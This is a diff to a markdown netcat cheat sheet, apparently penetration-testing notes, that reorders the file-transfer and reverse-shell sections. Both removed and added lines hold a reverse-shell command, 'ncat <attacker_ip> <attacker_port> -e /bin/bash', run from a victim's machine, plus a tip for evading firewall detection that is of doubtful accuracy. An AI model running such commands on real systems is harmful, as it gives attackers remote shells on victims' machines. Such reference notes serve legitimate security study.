@@ -74,13 +74,13 @@ Listen to an incoming connection on port `8080` and write any received data to
 `received_file`
 
 ```sh
-ncat -l 8080 > received_file
+ncat -l 8080 > <received_file>
 ```
 
 Connect to a server on port `8080` and send the content of `file_to_send`
 
 ```sh
-ncat localhost 8080 < file_to_send
+ncat localhost 8080 < <file_to_send>
 ```
 <!-- }}} -->
 
@@ -98,21 +98,29 @@ ncat -v -n -z localhost 80-90
 <!-- Reverse Shell {{{-->
 ### Reverse Shell
 
-Initiate a connection back to the target machine
+Open a listener and listen to an incoming connection
+
+1. Open a netcat listener
 
 ```sh
-ncat {attacker_ip} {attacker_port} -e /bin/bash
+ncat -lvnp <listening_port>
 ```
 
-Listen to an incoming connection
+> [!example]-
+>
+> ```sh
+> nc -lvnp 1234
+> ```
 
-```sh
-ncat -lvnp {listening port}
-```
-
-> [!tip]
+> [!tip]-
 >
 > Keep the listening port below `1000` to avoid firewall detection
+
+2. Initiate a connection from the victim's machine back to the attacker's machine
+
+```sh
+ncat <attacker_ip> <attacker_port> -e /bin/bash
+```
 <!-- }}} -->
 
 ## Resources
